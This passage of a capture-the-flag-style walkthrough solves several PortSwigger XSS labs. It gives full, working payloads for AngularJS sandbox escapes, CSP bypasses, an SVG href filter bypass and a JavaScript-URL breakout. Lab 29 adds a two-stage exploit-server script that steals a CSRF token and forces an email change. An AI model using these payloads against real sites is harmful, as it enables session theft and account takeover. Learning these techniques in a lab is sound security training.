2. **Break the Parser:** AngularJS's internal sandbox parser relies heavily on the `String.prototype.charAt()` function to read and validate expressions. We are going to overwrite `charAt` with `[].join` (Array join). This completely blinds and breaks the parser, allowing illegal code to slip through.
3. **Build the Payload with Math:** Since we can't use quotes to write `alert(1)`, we construct the payload using ASCII character codes via `String.fromCharCode()`.
4. **Execute via a Filter:** We pass our hidden payload into the `orderBy` filter, which natively evaluates the code it receives.

---

### **Step-by-Step Walkthrough**

Because we are dealing with a strict WAF and sandbox, we will pass this payload directly into the URL query parameters. Let's break down the payload piece by piece so you understand exactly what is happening under the hood.

### **Step 1: Break the Sandbox (Prototype Poisoning)**

First, we need to overwrite the `charAt` function for all strings.

1. We need a string to start with, but we can't type `"string"`. Instead, we just type `toString()`.
2. We access the String constructor and its prototype: `toString().constructor.prototype`.
3. We overwrite the `charAt` function with the array `join` function: `.charAt = [].join`.
    - *(Note: In the URL, the `=` sign must be encoded as `%3d` so the web server doesn't confuse it with a URL parameter).*

**Part 1 of Payload:** `toString().constructor.prototype.charAt%3d[].join;`

### **Step 2: Trigger the Execution Sink**

We need an AngularJS feature that evaluates code. The `orderBy` filter is perfect for this.

1. We create a dummy array: `[1]`
2. We pipe it into the filter: `|orderBy:`

**Part 2 of Payload:** `[1]|orderBy:`

### **Step 3: Construct the Stringless Payload**

We need to pass the string `x=alert(1)` to the `orderBy` filter, but we still can't use quotes.

1. We use ASCII decimal values for `x=alert(1)`:
    - `x` = 120
    - `=` = 61
    - `a` = 97, `l` = 108, `e` = 101, `r` = 114, `t` = 116
    - `(` = 40, `1` = 49, `)` = 41
2. We use `String.fromCharCode()` to turn those numbers back into a string, but we must access it without using the literal `String` object.
3. We use our `toString().constructor` trick again: `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`

**Part 3 of Payload:** `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`

### **Step 4: Assemble and Execute**

We combine all the parts into the URL. We also add `=1` at the end to ensure the AngularJS expression evaluates cleanly without throwing a syntax error at the very end.

**Final Raw Payload:**`toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

1. Open the lab.
2. Look at your address bar. You will see `/?search=`.
3. Paste the URL-encoded payload after `?search=`:
`1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`*(Note: We add `1&` at the beginning just to satisfy the search parameter's expected input before our exploit runs).*
4. Hit **Enter**.
5. AngularJS processes the URL, poisons the `charAt` prototype, fails to sanitize the `orderBy` input, decodes your ASCII characters, and executes the alert.
6. An alert box displaying "1" will pop up, and you've solved an Expert lab!

# **Lab 26 : Reflected XSS with AngularJS sandbox escape and CSP**

### **The Core Concept**

This lab forces us to bypass three separate layers of defense simultaneously:

1. **The Context (Reflected XSS):** We need to inject code.
2. **The Firewall (Content Security Policy - CSP):** The server has a strict CSP that blocks standard inline scripts (like `<script>alert(1)</script>`) and standard HTML events (like `onclick`).
3. **The Sandbox (AngularJS):** Even if we inject Angular expressions (`{{...}}`), Angular's sandbox actively prevents us from accessing the global `window` object to call `alert()`.
- **Bypassing CSP:** While the CSP blocks standard HTML events, it *allows* AngularJS's custom event directives (like `ng-focus`). We will use `ng-focus` to trigger our code without violating the CSP.
- **Escaping the Sandbox:** Angular blocks direct calls to `window`. However, when an event fires in Angular, it creates an `$event` object. If we call `$event.composedPath()` (or `$event.path` in older browsers), it returns an array of every HTML element the event touched. *The very last element in that array is the global `window` object!*
- **The Execution:** We pipe that array into Angular's `orderBy` filter. `orderBy` iterates through the array. When it hits the `window` object at the end, it executes our payload in the context of the window, completely bypassing the sandbox's restrictions!

---

### **Step-by-Step Walkthrough**

We have to deliver a "zero-click" payload to the victim because they aren't going to manually interact with our injected code.

### **Step 1: Craft the Injected Element**

We need to inject an element that can receive focus to trigger our `ng-focus` event. An `<input>` tag is perfect.

- **The Tag:** `<input id="x">` (We give it an ID so we can auto-focus it later).

### **Step 2: Build the Sandbox Escape**

We add the `ng-focus` directive to our input and use the `$event` object to grab the DOM path array.

- **The Trigger:** `ng-focus="$event.composedPath()"`

### **Step 3: Build the Execution Logic**

Now we pipe that array into the `orderBy` filter to iterate through it until we hit the `window` object.

Instead of writing `alert(document.cookie)` directly (which Angular might still flag), we use a neat JavaScript trick: we assign `alert` to a temporary variable `z`, and then immediately call it with `document.cookie`.

- **The Exploit:** `| orderBy:'(z=alert)(document.cookie)'`

**Combined Raw Payload:**`<input id="x" ng-focus="$event.composedPath()|orderBy:'(z=alert)(document.cookie)'">`

### **Step 4: The Auto-Focus Trick**

Just like a previous lab, our input tag will just sit there unless it receives focus. By appending `#x` to the end of the victim's URL, their browser will automatically snap focus to our injected `<input id="x">`, triggering the entire chain.

### **Step 5: Deliver the Exploit**

We need to force the victim to visit our maliciously crafted search URL.

1. Go to the **Exploit Server**.
2. In the **Body** section, paste the delivery script. We will URL-encode the payload so it doesn't break the victim's request.HTML
    
    `<script>
    location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
    </script>`
    
    *(Make sure to replace `YOUR-LAB-ID` with your actual lab instance URL).*
    
3. Click **Store**.
4. Click **Deliver exploit to victim**.
5. The victim loads the exploit server, gets redirected to the lab, the browser auto-focuses on the injected input `#x`, the `ng-focus` event fires (bypassing CSP), grabs the DOM path, iterates through it using `orderBy`, reaches the `window` object (escaping the sandbox), and executes the alert!

# **Lab 27: Reflected XSS with event handlers and `href` attributes blocked**

### **The Core Concept**

This lab introduces **SVG Animation Attribute Manipulation** to bypass strict WAF blacklists.

- **The Constraints:** The WAF strictly blocks all HTML event handlers (`onclick`, `onfocus`, etc.) and the `href` attribute. This means a standard `<a href="...">` link is impossible.
- **The Trick:** We can use Scalable Vector Graphics (`<svg>`) to draw our own clickable link. More importantly, we can use the SVG `<animate>` tag to dynamically assign an `href` property to a parent tag *after* it passes the WAF.
- **The Exploit:** We create an empty `<a>` tag (which bypasses the `href` filter because it doesn't have one). Inside it, we place an `<animate>` tag and set its `attributeName` to `href` and its `values` to our payload (`javascript:alert(1)`). The WAF only blocks actual `href="..."` attributes; it completely ignores the word "href" when it is just a string value assigned to `attributeName`!

---

### **Step-by-Step Walkthrough**

We need to build a vector graphic that visually contains the word "Click" (so the simulated victim interacts with it) and executes our code.

### **Step 1: Understand the SVG Structure**

Let's break down the exact HTML tags we need to build this trap:

1. **The Canvas:** `<svg>` (Initiates the vector graphic context).
2. **The Anchor:** `<a>` (Creates an anchor element. Notice we do not include an `href` attribute here, which allows it to slip past the WAF).
3. **The Bypass (Animation):** `<animate attributeName="href" values="javascript:alert(1)" />` (This dynamically animates the parent `<a>` tag, effectively giving it an `href` property containing our JavaScript payload under the hood).
4. **The Bait:** `<text x="20" y="20">Click me</text>` (Draws the visible text on the screen so the simulated lab bot has something to click).
5. **The Closers:** `</a></svg>`

**Raw Payload:** `<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x="20" y="20">Click me</text></a></svg>`

### **Step 2: URL Encode the Payload**

Because we are passing this payload directly into the URL's search parameter, it needs to be URL-encoded so the browser parses it correctly over HTTP.

**Encoded Payload:**`%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`

### **Step 3: Execute the Exploit**

1. Open the lab.
2. Go to your browser's address bar.
3. Append the encoded payload to the `?search=` parameter:
`.../?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`
4. Hit **Enter**.
5. The page will load, and you will see the text "Click me" rendered as an SVG graphic.
6. The simulated victim bot detects the word "Click" and clicks the SVG text. Because the `<animate>` tag dynamically added the `javascript:` payload to the anchor, the browser executes the code.
7. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 28 : Reflected XSS in a JavaScript URL with some characters blocked**

### **The Core Concept**

This lab introduces **Implicit Execution via Type Coercion** and **Exception Handling Bypasses**.

- **The Trap:** Your input is reflected inside a JavaScript URL (e.g., `<a href="javascript:fetch('...&postId=5&YOUR_INPUT')">`).
- **The Defense:** The application has a Web Application Firewall (WAF) blocking spaces and likely standard function calls (like `alert(1337)`).
- **The Exploit Strategy:** Since we can't just type `alert(1337)` and we can't use spaces, we have to force the browser to execute our code through a chain of JavaScript engine loopholes:
    1. **Throw an Exception:** We can't *call* the alert function, but we can assign `alert` to be the global error handler (`onerror`). Then, if we `throw` an error containing the number `1337`, the `onerror` handler catches it and alerts it for us!
    2. **No Spaces:** We use JavaScript block comments `/**/` to act as spaces.
    3. **Implicit Execution:** To trigger our code without directly calling it, we hijack a native JavaScript method (`toString`). We then force the browser to convert an object to a string (Type Coercion), which silently executes our hijacked method in the background.

---

### **Step-by-Step Walkthrough**

Let's dissect this monstrous payload piece by piece. It's essentially a masterclass in writing JavaScript without using standard syntax.

### **Step 1: The Exception Handler Trick**

We need to trigger `alert(1337)` without writing `alert(1337)`.

- We assign the global error handler to `alert`: `onerror=alert`
- We use the `throw` statement to intentionally crash the script and pass the number `1337` as the error message.
- Because `throw` requires a space after it (which is blocked), we use `/**/`.
- *Code:* `throw/**/onerror=alert,1337`

### **Step 2: The Arrow Function Wrapper**

The `throw` command is a "statement", meaning it can't just be placed freely inside a comma-separated list of values. We have to wrap it in an arrow function to create a valid code block.

- We define a function `x`: `x=x=>{...}`
- *Code:* `x=x=>{throw/**/onerror=alert,1337}`

### **Step 3: The Implicit Execution (Type Coercion)**

Now we have a function `x` that throws our alert, but how do we execute `x` without calling `x()`?

- We overwrite the global `toString` method with our function: `toString=x`
- Now, anytime the browser is forced to turn the global `window` object into a string, it will run our function `x` instead.
- We force this string conversion by trying to add an empty string to the `window` object: `window+''`
- *Code:* `toString=x,window+''`

### **Step 4: Assembly and Cleanup**

We need to break out of the original JavaScript syntax and clean up the trailing code.

- **Breakout:** `'},` (Closes the developer's original string and object).
- **The Exploit:** `x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',`
- **Cleanup:** `{x:'` (Opens a new object and string to safely absorb the rest of the developer's trailing code).

**Raw Payload:** `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`

### **Step 5: URL Encode and Execute**

Because we are passing this through the URL, we must encode characters like quotes (`'`), plus signs (`+`), and angle brackets (`>`).

**Encoded Payload:** `%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`

1. Open the lab.
2. Click on any **Blog Post** (e.g., `postId=5`).
3. Go to your browser's address bar. Append the encoded payload directly after the `postId=5&` parameter:
`.../post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
4. Hit **Enter** to load the page.
5. Scroll down to the bottom of the page and click the **"Back to blog"** link. (This link contains the vulnerable `javascript:` URL).
6. The browser executes the JavaScript link, assigns the `toString` method, forces the type coercion on `window`, throws the exception, and the `onerror` handler catches it.
7. An alert box displaying "1337" will pop up, and the lab is solved!

# **Lab 29 : Reflected XSS protected by very strict CSP, with dangling markup attack**

### **The Core Concept**

This lab demonstrates how to bypass a strict Content Security Policy (CSP) using **Form Hijacking**.

- **The Obstacle:** The application reflects our input into an HTML form, but a strict CSP blocks all inline scripts (`<script>`) and external scripts. We cannot use traditional XSS payloads to execute JavaScript.
- **The Flaw:** While the CSP blocks scripts, it forgets to restrict where HTML forms are allowed to submit data (a missing `form-action` directive).
- **The Exploit:** Because our reflected input lands inside an existing `<form>` that contains a hidden anti-CSRF token, we can inject a new HTML `<button>`. By adding the `formaction` and `formmethod` attributes to this button, we can hijack the surrounding form. When the victim clicks our button, their browser takes all the data inside the form (including their secret CSRF token) and sends it directly to our exploit server.

---

### **Step-by-Step Walkthrough**

This exploit requires a two-stage attack. First, we lure the victim to the vulnerable page and trick them into clicking a button that leaks their token to us. Second, our server catches that token and immediately uses it to forge a valid email-change request.

### **Step 1: Test the Injection Point**

1. Log in to the lab using the credentials `wiener` / `peter`.
2. Navigate to the **My account** page and look at the "Update email" form.
3. If you add `?email=test" autofocus>` to the URL and inspect the page source, you will see your input reflects directly inside the email input tag:
`<input required type="email" name="email" value="test" autofocus>">`
4. If you try to inject `<script>alert(1)</script>`, the browser console will show an error stating the CSP blocked the execution.

### **Step 2: Craft the Form Hijacking Button**

Instead of a script, we will inject a button to hijack the form submission.

1. Close the existing `value` attribute with a quote and bracket: `">`
2. Inject a new button: `<button>`
3. Add the `formaction` attribute pointing to your exploit server: `formaction="https://YOUR-EXPLOIT-SERVER.exploit-server.net/exploit"`
4. Add the `formmethod` attribute set to `GET`: `formmethod="get"` (This forces the browser to append the form's hidden CSRF token into the URL so we can read it in our server logs).
5. Add the required text: `Click me</button>`

**Raw Payload:** `"><button formaction="https://YOUR-EXPLOIT-SERVER.exploit-server.net/exploit" formmethod="get">Click me</button>`

### **Step 3: Build the Two-Stage Exploit Script**

Now we configure the Exploit Server to handle the attack flow.

1. Go to the **Exploit Server**.
2. In the **Body** section, paste the following script. *Carefully replace the URLs with your specific lab and exploit server addresses.*

HTML

`<body>
<script>
const academyFrontend = "https://YOUR-LAB-ID.web-security-academy.net/";
const exploitServer = "https://YOUR-EXPLOIT-SERVER.exploit-server.net/exploit";

const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;

    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>`

### **Step 4: Understand the Script Logic**

- **If there is NO token in the URL (The Initial Lure):** The `else` block runs. It redirects the victim from the exploit server to the vulnerable lab page, injecting the malicious button into the URL.
- **The Interaction:** The victim sees the injected "Click me" button on the lab page. When they click it, the hijacked form submits a GET request back to your exploit server, bringing the hidden CSRF token along in the URL parameters.
- **If there IS a token in the URL (The Final Strike):** The `if (csrf)` block runs. It extracts the stolen token from the URL, dynamically builds a brand new HTML form in the background, inputs the stolen token and the malicious email (`hacker@evil-user.net`), and automatically submits it to the lab's backend.

### **Step 5: Execute the Exploit**

1. Click **Store** on the Exploit Server.
2. Click **Deliver exploit to victim**.
3. The automated victim follows the chain, clicks the button, leaks their token, and has their email forcibly changed. The lab is solved!

# **Lab 30: Reflected XSS protected by CSP, with CSP bypass**

### **The Core Concept**

This lab introduces **Content Security Policy (CSP) Injection**.

- **The Defense (CSP):** A Content Security Policy is an HTTP response header that tells the browser exactly what it is allowed to load and execute. For example, it can explicitly say, "Do not run any inline scripts."
- **The Flaw:** The application dynamically generates its CSP header based on user input. Specifically, it tracks errors using the `report-uri` directive and appends a user-controlled `token` parameter to it.
- **The Exploit:** Because we control the `token` parameter, we can inject a semicolon (`;`). In CSP syntax, a semicolon signifies the end of one rule and the beginning of a new one. By injecting `;script-src-elem 'unsafe-inline'`, we forcefully add a brand new rule to the server's security policy that explicitly gives us permission to run inline scripts!

---

### **Step-by-Step Walkthrough**

*Note: As the lab mentions, you should use Google Chrome for this, as different browsers handle conflicting CSP rules slightly differently.*

### **Step 1: Observe the Block**

Let's see the CSP in action.

1. Open the lab.
2. Type a standard payload into the search box: `<script>alert(1)</script>`
3. Click **Search**.
4. The payload reflects on the page, but no alert pops up. If you open your browser's Developer Tools (Console tab), you will see a red error stating that the Content Security Policy blocked the inline script.

### **Step 2: Find the Injection Point**

We need to look at the HTTP headers, not just the HTML source code.

1. Open **Burp Suite** and go to the **Proxy** > **HTTP history** tab.
2. Find the `GET` request for your search (e.g., `/?search=%3Cscript...`).
3. Look at the **Response** section. Find the `Content-Security-Policy` header.
4. **Analyze:** It will look something like this:
`Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; report-uri /csp-report?token=...`*Notice the `token=` at the very end. If we modify the URL to include our own `&token=HACKER`, it will reflect directly inside this security header.*

### **Step 3: Craft the CSP Bypass**

We want to overwrite the strict `script-src` rule. In modern CSP Level 3, the `script-src-elem` directive specifically controls `<script>` elements and overrides the broader `script-src` directive.

1. **Break out of the current directive:** We use a semicolon `;` to finish the `report-uri` rule.
2. **Inject the new directive:** `script-src-elem`
3. **Set the unsafe permission:** `'unsafe-inline'` (This tells the browser that inline `<script>` tags are perfectly safe to run).

**CSP Payload:** `;script-src-elem 'unsafe-inline'`*(URL Encoded: `%3Bscript-src-elem%20%27unsafe-inline%27`)*

### **Step 4: Execute the Double Payload**

We need to send *two* payloads simultaneously in the URL: our XSS script in the `search` parameter, and our CSP bypass in the `token` parameter.

1. Go to your browser's address bar.
2. Construct the URL with both payloads:
`.../?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`
3. The properly URL-encoded version looks like this:
`https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`
4. Hit **Enter**.
5. **What happens:** The server sends back the HTML containing your `<script>` tag. It *also* sends back a modified CSP header that says `...report-uri /csp-report?token=;script-src-elem 'unsafe-inline'`. The browser reads this new policy, sees that inline scripts are now allowed, and executes your alert!
6. An alert box displaying "1" will pop up, and the lab is solved!